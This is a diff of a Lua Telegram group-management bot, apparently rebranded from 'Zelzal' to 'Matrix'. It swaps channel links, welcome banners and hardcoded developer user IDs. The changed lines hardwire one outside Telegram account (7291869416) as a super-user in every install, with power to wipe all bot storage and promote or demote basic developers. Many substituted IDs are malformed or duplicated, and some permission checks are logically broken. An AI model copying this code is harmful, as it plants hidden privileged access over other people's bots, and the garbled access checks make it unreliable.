@@ -110,7 +110,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos = {Sudo_Id,1895219306}
+local ListSudos = {Sudo_Id,7291869416}
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -133,9 +133,9 @@ function Controllerbanall(ChatId,UserId)
 Status = 0
 local Controll2 = Redis:sismember(Zelzal.."Zelzal:ControlAll:Groups",UserId)
 DevelopersQ = Redis:sismember(Zelzal.."Zelzal:DevelopersQ:Groups",UserId) 
-if UserId == 1895219306 then
+if UserId == 7291869416 then
 Status = true
-elseif UserId == 925972505 or UserId == 5746412340 or UserId == 6269975462 or UserId == 1985225531 then
+elseif UserId == 7291869416 or UserId == 7291869416 or UserId == 7291869416 or UserId == 7291869416 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -177,9 +177,9 @@ Mddictive = Redis:sismember(Zelzal.."Zelzal:Mddictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(Zelzal.."Zelzal:Distinguished:Group"..ChatId,UserId)
 Mistinguished = Redis:sismember(Zelzal.."Zelzal:Mistinguished:Group"..ChatId,UserId)
 StatusMember = bot.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1895219306 then
+if UserId == 7291869416 then
 Status = 'مبرمج السورس🎖️'
-elseif UserId == 925972505 or UserId == 5746412340 or UserId == 6269975462 or UserId == 1985225531 then
+elseif UserId == 72918694163 or UserId == 72918694165 or UserId == 72918694163 or UserId == 729186941600 then
 Status = 'مطور السورس🎖️'
 elseif UserId == Sudo_Id then  
 Status = Redis:get(Zelzal.."Zelzal:Sudo:General:Reply") or 'مطور اساسي🎖️'
@@ -358,12 +358,12 @@ end
 if Redis:get(Zelzal..'chsource') then
 chsource = Redis:get(Zelzal..'chsource')
 else
-chsource = "Z_ZZZ8"
+chsource = "O_P_G"
 end
 if Redis:get(Zelzal..'chdevolper') then
 chdevolper = Redis:get(Zelzal..'chdevolper')
 else 
-chdevolper = "zzzzl1l"
+chdevolper = "BDB0B"
 end
 function FlterBio(Bio)
 local Bio = tostring(Bio):lower()
@@ -1539,10 +1539,10 @@ end
 end
 return false
 end
-if tonumber(msg.sender_id.user_id) == 1895219306 then
+if tonumber(msg.sender_id.user_id) == 7291869416 then
 msg.Name_Controller = 'مبرمج السورس🎖️'
 msg.The_Controller = 1
-elseif tonumber(msg.sender_id.user_id) == 925972505 or tonumber(msg.sender_id.user_id) == 5746412340 or tonumber(msg.sender_id.user_id) == 1985225531 then
+elseif tonumber(msg.sender_id.user_id) == 7291869416 or tonumber(msg.sender_id.user_id) == 7291869416 or tonumber(msg.sender_id.user_id) == 7291869416 then
 msg.Name_Controller = 'مطور السورس🎖️️'
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender_id.user_id) == true then  
@@ -4982,7 +4982,7 @@ end
 return send(msg_chat_id,msg_id,'\n⇜ تم تحديث السورس  ',"md",true)  
 end
 if text == "مسح تخزين البوت" or text == "مسح تخزين البوت" then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) then 
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) then 
 local keys = Redis:keys(Zelzal..'*')
 for i = 1, #keys do
 Redis:del(keys[i])
@@ -4993,7 +4993,7 @@ end
 if text == 'معلومات التنصيب' or text == 'معلومات التنصيب' then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then 
 usersend = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then 
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then 
 usersend = true
 else
 usersend = false
@@ -5025,7 +5025,7 @@ return send(msg_chat_id,msg_id, '⇜ حسناً عزيزي \n⇜ الان قم �
 end 
 end
 if text == "ضع تاريخ الاشتراك" or text == "وضع تاريخ الاشتراك" then
-if msg.sender_id.user_id ~= 1895219306 or msg.sender_id.user_id ~= 925972505 then 
+if msg.sender_id.user_id ~= 7291869416 or msg.sender_id.user_id ~= 7291869416 then 
 return send(msg_chat_id,msg_id,'\n*⇜ هـذا الامـر يخـص* ( مطور السورس ) ',"md",true)  
 end
 Redis:set(Zelzal.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id,true)
@@ -5863,7 +5863,7 @@ end
 if text == 'ثيمات' or text == 'ثيم' then
 local ban = bot.getUser(msg.sender_id.user_id)
 local Name = '['..ban.first_name..'](tg://user?id='..ban.id..')'
-local Zilzal = '*⇜ مرحبـاً عـزيـزي ⇜ *'..Name..',\n*⇜ في متجـر ثيمـات سـورس 𝗭𝗲𝗹𝘇𝗮𝗹\n⇜ يوجـد في البـوت اكثـر من 100 ثيـم مميـز*'
+local Zilzal = '*⇜ مرحبـاً عـزيـزي ⇜ *'..Name..',\n*⇜ في متجـر ثيمـات سـورس 𝙈𝘼𝙏𝙍𝙄𝙓\n⇜ يوجـد في البـوت اكثـر من 100 ثيـم مميـز*'
 local m = "https://t.me/Z_ZZZ8/71"
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -7290,7 +7290,7 @@ if text and text:match('^رفع مطور اساسي @(%S+)$') then
 local UserName = text:match('^رفع مطور اساسي @(%S+)$')
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -7319,7 +7319,7 @@ if text and text:match('^تنزيل مطور اساسي @(%S+)$') then
 local UserName = text:match('^تنزيل مطور اساسي @(%S+)$')
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -7347,7 +7347,7 @@ end
 if text == ('رفع مطور اساسي') and msg.reply_to_message_id ~= 0 then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -7373,7 +7373,7 @@ end
 if text == ('تنزيل مطور اساسي') and msg.reply_to_message_id ~= 0 then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -7400,7 +7400,7 @@ if text and text:match('^رفع مطور اساسي (%d+)$') then
 local UserId = text:match('^رفع مطور اساسي (%d+)$')
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -7423,7 +7423,7 @@ if text and text:match('^تنزيل مطور اساسي (%d+)$') then
 local UserId = text:match('^تنزيل مطور اساسي (%d+)$')
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -7445,7 +7445,7 @@ end
 if text == 'مسح المطورين الاساسيين' then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -7463,7 +7463,7 @@ end
 if text == 'المطورين الاساسيين' then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then
 YouCan = true
-elseif tonumber(msg.sender_id.user_id) == tonumber(1895219306) then
+elseif tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 YouCan = true
 else
 YouCan = false
@@ -8098,10 +8098,10 @@ local bain = bot.getUser(msg.sender_id.user_id)
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(msg.sender_id.user_id) then
 return send(msg_chat_id,msg_id,"*- ايا مطـي .. تريـد تنتحـر ؟!*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(1895219306) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) then
 return send(msg_chat_id,msg_id,"*يحمـار دا مبرمج السورس ممكن يفشخني انا وانتـه 😂😞*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(5746412340) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416322) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
 return send(msg_chat_id,msg_id,"*يحمـار ده مطـور البـوت .. تاج راسـك 😹😞*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(Zelzal) then
@@ -8135,10 +8135,10 @@ local bain = bot.getUser(msg.sender_id.user_id)
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(msg.sender_id.user_id) then
 return send(msg_chat_id,msg_id,"*- ايا مطـي .. تريـد البـوت يتفل عليـك ؟!*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(1895219306) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) then
 return send(msg_chat_id,msg_id,"*يحمـار دا مبرمج السورس ممكن يفشخني انا وانتـه 😂😞*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(5746412340) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416432) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
 return send(msg_chat_id,msg_id,"*يحمـار ده مطـور البـوت .. تاج راسـك 😹😞 تفو عليك انته*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(Zelzal) then
@@ -8286,7 +8286,7 @@ send(UserId,0,"-"..saihh.."\n*هـذا يصيحـك ->* "..klajq.."","md",true, 
 send(msg_chat_id,msg_id, "*⇜ ابشـر سيـدي سـوف اقـوم بازعاجـه خـاص*","md",true)
 end
 ---------------------- Dev ZilZal ----------------------
-local Bot_Name = (Redis:get(Zelzal.."Zelzal:Name:Bot") or "زلزال")
+local Bot_Name = (Redis:get(Zelzal.."Zelzal:Name:Bot") or "ماتركس")
 if text and  text:match("^"..Bot_Name.." اتفل(.*)$") and msg.Managers then
 if Redis:sismember(Zelzal.."Zelzal:Text:Cmd:Lock"..msg_chat_id,text) then
 if Locks_Status(msg.sender_id.user_id,msg,text) ~= "noon" then
@@ -8294,10 +8294,10 @@ return send(msg_chat_id,msg_id,Locks_Status(msg.sender_id.user_id,msg,text),"md"
 end
 end
 local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(1895219306) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
 return send(msg.chat_id,msg.id,"*يحمـار دا مبرمج السورس ممكن يفشخني انا وانتـه 😂😞*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(5746412340) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416532) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
 return send(msg.chat_id,msg.id,"*يحمـار ده مطـور البـوت .. تاج راسـك 😹😞*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(Zelzal) then
@@ -8362,10 +8362,10 @@ local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(msg.sender_id.user_id) then
 return send(msg.chat_id,msg.id,"*ايا مطـي .. تريـد تـرزل نفسـك ؟!*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(1895219306) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
 return send(msg.chat_id,msg.id,"*يحمـار دا مبرمج السورس ممكن يفشخني انا وانتـه 😂😞*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(5746412340) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416542) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
 return send(msg.chat_id,msg.id,"*يحمـار ده مطـور البـوت .. تاج راسـك 😹😞*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(Zelzal) then
@@ -8398,10 +8398,10 @@ local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(msg.sender_id.user_id) then
 return send(msg.chat_id,msg.id,"*ايا مطـي .. تريـد تـرزل نفسـك ؟!*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(1895219306) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
 return send(msg.chat_id,msg.id,"*يحمـار دا مبرمج السورس ممكن يفشخني انا وانتـه 😂😞*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(5746412340) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416544) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
 return send(msg.chat_id,msg.id,"*يحمـار ده مطـور البـوت .. تاج راسـك 😹😞*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(Zelzal) then
@@ -8464,10 +8464,10 @@ if not Redis:get(Zelzal.."amrthshesh"..msg.chat_id) then
 local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
 local UserInfo = bot.getUser(Message_Reply.sender_id.user_id)
 local FlterName = UserInfo.first_name
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(1895219306) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
 return send(msg.chat_id,msg.id,"*يحمـار دا مبرمج السورس ممكن يفشخني انا وانتـه 😂😞*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(5746412340) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416543) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
 return send(msg.chat_id,msg.id,"*يحمـار ده مطـور البـوت .. تاج راسـك 😹😞*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(Zelzal) then
@@ -8515,10 +8515,10 @@ if not Redis:get(Zelzal.."amrthshesh"..msg.chat_id) then
 local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
 local UserInfo = bot.getUser(Message_Reply.sender_id.user_id)
 local FlterName = UserInfo.first_name
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(1895219306) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
 return send(msg.chat_id,msg.id,"*يحمـار دا مبرمج السورس ممكن يفشخني انا وانتـه 😂😞*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(5746412340) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416432) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
 return send(msg.chat_id,msg.id,"*يحمـار ده مطـور البـوت .. تاج راسـك 😹😞*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(Zelzal) then
@@ -8531,7 +8531,7 @@ https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. 
 end
 end
 end
-if text=="اتفل" or text=="تفل" then
+if text=="اتفل" or text=="تفل" or text =="تف" then
 if Redis:sismember(Zelzal.."Zelzal:Text:Cmd:Lock"..msg_chat_id,text) then
 if Locks_Status(msg.sender_id.user_id,msg,text) ~= "noon" then
 return send(msg_chat_id,msg_id,Locks_Status(msg.sender_id.user_id,msg,text),"md",true)
@@ -8539,10 +8539,10 @@ end
 end
 if msg.reply_to_message_id then
 local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(1895219306) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(7291869416) or tonumber(Message_Reply.sender_id.user_id) == tonumber(925972505) or tonumber(Message_Reply.sender_id.user_id) == tonumber(2095357462) then
 return send(msg.chat_id,msg.id,"*يحمـار دا مبرمج السورس ممكن يفشخني انا وانتـه 😂😞*","md",true)  
 end
-if tonumber(Message_Reply.sender_id.user_id) == tonumber(5746412340) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
+if tonumber(Message_Reply.sender_id.user_id) == tonumber(574641234092) or tonumber(Message_Reply.sender_id.user_id) == tonumber(5280339206) or tonumber(Message_Reply.sender_id.user_id) == tonumber(1985225531) or tonumber(Message_Reply.sender_id.user_id) == tonumber(Sudo_Id) then
 return send(msg.chat_id,msg.id,"*يحمـار ده مطـور البـوت .. تاج راسـك 😹😞*","md",true)  
 end
 if tonumber(Message_Reply.sender_id.user_id) == tonumber(Zelzal) then
@@ -15415,31 +15415,31 @@ bot.deleteMessages(msg.chat_id,{[1]= msg_id})
 end
 ---------------------- Dev ZilZal ----------------------
 if text == 'مسح خمس نجمات' or text == 'حذف خمس نجمات' then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:del(Zelzal..'Zilzal:Takeem:T5')
 send(msg_chat_id,msg_id,'*⇜ تم مسـح جميـع تقييم الخمس نجمات .. بنجـاح ✓*',"md",true)
 end
 end
 if text == 'مسح اربع نجمات' or text == 'حذف اربع نجمات' then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:del(Zelzal..'Zilzal:Takeem:T4')
 send(msg_chat_id,msg_id,'*⇜ تم مسـح جميـع تقييم الاربع نجمات .. بنجـاح ✓*',"md",true)
 end
 end
 if text == 'مسح ثلاث نجمات' or text == 'حذف ثلاث نجمات' then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:del(Zelzal..'Zilzal:Takeem:T3')
 send(msg_chat_id,msg_id,'*⇜ تم مسـح جميـع تقييم الثلاث نجمات .. بنجـاح ✓*',"md",true)
 end
 end
 if text == 'مسح نجمتان' or text == 'حذف نجمتان' then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:del(Zelzal..'Zilzal:Takeem:T2')
 send(msg_chat_id,msg_id,'*⇜ تم مسـح جميـع تقييم النجمتان .. بنجـاح ✓*',"md",true)
 end
 end
 if text == 'مسح نجمه' or text == 'حذف نجمه' then
-if tonumber(msg.sender_id.user_id) == tonumber(1895219306) or tonumber(msg.sender_id.user_id) == tonumber(925972505) or tonumber(msg.sender_id.user_id) == tonumber(5280339206) then
+if tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) or tonumber(msg.sender_id.user_id) == tonumber(7291869416) then
 Redis:del(Zelzal..'Zilzal:Takeem:T1')
 send(msg_chat_id,msg_id,'*⇜ تم مسـح جميـع تقييم النجمه .. بنجـاح ✓*',"md",true)
 end
@@ -16392,17 +16392,17 @@ return bot.sendAudio(msg_chat_id, msg.id, audio, audioc, "md", nil, nil, nil, ni
 end
 else
 local Text =[[
-⦑ 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙕𝙀𝙇𝙕𝘼𝙇 𝙎𝙊𝙐𝙍𝘾𝙀 🧧 ⦒
+⦑ 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙈𝘼𝙏𝙍𝙄𝙓 𝙎𝙊𝙐𝙍𝘾𝙀 🧧 ⦒
 ★┉ ┉ ┉ ┉ ┉ ᶻᵉˡᶻᵃˡ ┉  ┉ ┉ ┉ ┉★
-➥┇W𝙴𝙻𝙲𝙾𝙼𝙴 T𝙾 Z𝙴𝙻Z𝙰𝙻 S𝙾𝚄𝚁𝙲𝙴
-➥┇B𝙴𝚂𝚃 A𝚁𝙰𝙱𝙸𝙲 S𝙾𝚄𝚁𝙲𝙴️ ️
-➥┇B𝙴𝚂𝚃 S𝙴𝙲𝚄𝚁𝙸𝚃𝚈
-★┉ ┉ ┉ ┉ ┉ ᶻᵉˡᶻᵃˡ ┉  ┉ ┉ ┉ ┉★
+➥┇𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙈𝘼𝙏𝙍𝙄𝙓 𝙎𝙊𝙐𝙍𝘾𝙀
+➥┇𝘽𝙀𝙎𝙏 𝘼𝙍𝘼𝘽𝙄𝘾 𝙎𝙊𝙐𝙍𝘾𝙀 ️
+➥┇𝘽𝙀𝙎𝙏 𝙎𝙀𝘾𝙐𝙍𝙏𝙔
+★┉ ┉ ┉ ┉ ┉ ᴹᴬᵀᴿᴵˣ ┉  ┉ ┉ ┉ ┉★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '˹  𝗨𝗽𝗱𝗮𝘁𝗲 ⁦. 𓌗', url = 't.me/uzz_zz'},},
-{{text = '˹  𝗭𝗲𝗹𝗭𝗮𝗹 ⁦. 𓌗', url = 't.me/z_zzz8 '},},
+{{text = '˹  𝗨𝗽𝗱𝗮𝘁𝗲 ⁦. 𓌗', url = 't.me/VEEVVW'},},
+{{text = '˹  𝙈𝘼𝙏𝙍𝙄𝙓 ⁦. 𓌗', url = 't.me/O_P_G '},},
 }
 local msg_id = msg.id/2097152/0.5
 return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/Z_ZZZ8/71?single&caption=' ..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -16489,9 +16489,9 @@ data = {
 }
 local TextHelp = [[
 *✦ قائمــة العــاب البــوت ⁦.🎳 𓌗*
-ٴ★┉ ┉ ┉ ┉ ┉ ᶻᵉˡᶻᵃˡ ┉  ┉ ┉ ┉ ┉★
+ٴ★┉ ┉ ┉ ┉ ┉ ᴹᴬᵀᴿᴵˣ ┉  ┉ ┉ ┉ ┉★
 ✦ اكـثـر من 100 لعبـة مسليـة وجديـدة
-ٴ★┉ ┉ ┉ ┉ ┉ ᶻᵉˡᶻᵃˡ ┉  ┉ ┉ ┉ ┉★
+ٴ★┉ ┉ ┉ ┉ ┉ ᴹᴬᵀᴿᴵˣ ┉  ┉ ┉ ┉ ┉★
 ✦ العـاب الانـلايـن 🕹  » بلاي
 ✦ البنـك الشهيـرة 🏦  » بنك
 ✦ أحكـام الشهيـره ⚖  » احكام
@@ -16535,13 +16535,13 @@ local TextHelp = [[
 ✦ اسئــله متنـوعـة » اسئله
 ✦ لعبـة اسئلـه دينيـة » دين
 ✦ لعبـة التفكيـك » تفكيك
-ٴ★┉ ┉ ┉ ┉ ┉ ᶻᵉˡᶻᵃˡ ┉  ┉ ┉ ┉ ┉★
+ٴ★┉ ┉ ┉ ┉ ┉ ᴹᴬᵀᴿᴵˣ ┉  ┉ ┉ ┉ ┉★
 *✦ متجـر الـرتب 💳🎖*
 - لشـراء رتبه بالبوت مقابل نقاط الالعاب
 ← ❨ متجر الرتب ❩ لعـرض المتجـر
 ← ❨ شراء رتبه ❩ لشـراء رتبـه مقابـل نقـاط
 ← تفعيل / تعطيل ❨ متجر الرتب ❩
-ٴ★┉ ┉ ┉ ┉ ┉ ᶻᵉˡᶻᵃˡ ┉  ┉ ┉ ┉ ┉★
+ٴ★┉ ┉ ┉ ┉ ┉ ᴹᴬᵀᴿᴵˣ ┉  ┉ ┉ ┉ ┉★
 ✦ نقاطي ← لعـرض عـدد نقـاطك
 ✦ بيع نقاطي + { العدد }
 كل نقطه مقابل (50) رساله
@@ -16738,7 +16738,7 @@ Redis:incrby(Zelzal.."Zelzal:Num:Message:User"..msg.chat_id..":"..Message_Reply.
 return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender_id.user_id,"⇜ تم اضافه له ( "..text:match("^اضف رسائل (%d+)$").." ) رسالة").Reply,"md",true)  
 end
 if text and text:match("^اضف لايكات (%d+)$") and msg.reply_to_message_id ~= 0 then
